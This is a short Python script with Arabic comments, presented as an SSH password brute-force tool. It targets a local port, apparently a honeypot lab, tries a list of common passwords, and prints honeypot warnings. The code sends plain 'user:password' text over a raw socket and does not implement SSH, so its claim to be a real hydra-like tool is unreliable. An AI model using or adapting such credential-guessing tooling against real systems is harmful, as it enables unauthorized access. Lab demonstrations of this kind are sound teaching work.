#!/usr/bin/env python3
"""
🔐 SSH Brute Force - هجوم تخمين كلمات السر
أداة حقيقية لاختبار SSH مثل hydra
"""
import socket
import time
from datetime import datetime

TARGET = "127.0.0.1"
PORT = 2222
USERNAME = "admin"

# قائمة كلمات السر الشائعة
PASSWORDS = [
    "admin", "password", "123456", "root", "admin123",
    "password123", "qwerty", "letmein", "welcome", "monkey",
    "1234567890", "abc123", "password1", "admin@123", "P@ssw0rd"
]

print("=" * 70)
print("🔐 SSH BRUTE FORCE ATTACK")
print("=" * 70)
print(f"🎯 Target: {TARGET}:{PORT}")
print(f"👤 Username: {USERNAME}")
print(f"📋 Passwords to try: {len(PASSWORDS)}")
print(f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}")
print("=" * 70)
print()

attempts = 0
success = False

for password in PASSWORDS:
    attempts += 1
    print(f"[{attempts:2d}/{len(PASSWORDS)}] Trying: {password:20s} ...", end=" ")
    
    try:
        # محاولة الاتصال بـ SSH
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET, PORT))
        
        # استقبال banner
        banner = sock.recv(1024)
        
        # إرسال البيانات (مبسطة - في الواقع SSH أعقد)
        auth_data = f"{USERNAME}:{password}\n".encode()
        sock.send(auth_data)
        
        # انتظار الرد
        time.sleep(0.5)
        response = sock.recv(1024)
        
        # في honeypot، قد يستجيب بشكل مختلف
        if b"success" in response.lower() or b"welcome" in response.lower():
            print("✅ SUCCESS! 🎉")
            success = True
            sock.close()
            break
        else:
            print("❌ FAILED")
        
        sock.close()
        
    except socket.timeout:
        print("⏱️ TIMEOUT")
    except Exception as e:
        print(f"❌ ERROR: {str(e)[:30]}")
    
    # تأخير بسيط لتجنب الحظر الفوري
    time.sleep(0.3)

print()
print("=" * 70)
print("📊 ATTACK RESULTS:")
print("=" * 70)
print(f"🔢 Total attempts: {attempts}")
print(f"✅ Success: {'YES! 🎉' if success else 'NO 😞'}")
print()
if not success:
    print("⚠️ WARNING:")
    print("   • System may have detected brute force attack")
    print("   • Your IP might be logged and blocked")
    print("   • This could be a HONEYPOT!")
    print("   • All your attempts are being recorded...")
else:
    print("🚨 ALERT:")
    print("   • You got in! But wait...")
    print("   • This might be a FAKE SSH session (honeypot)")
    print("   • Everything you type is being monitored")
    print("   • The real system is somewhere else")
print()
print(f"⏰ Finished: {datetime.now().strftime('%H:%M:%S')}")
print("=" * 70)
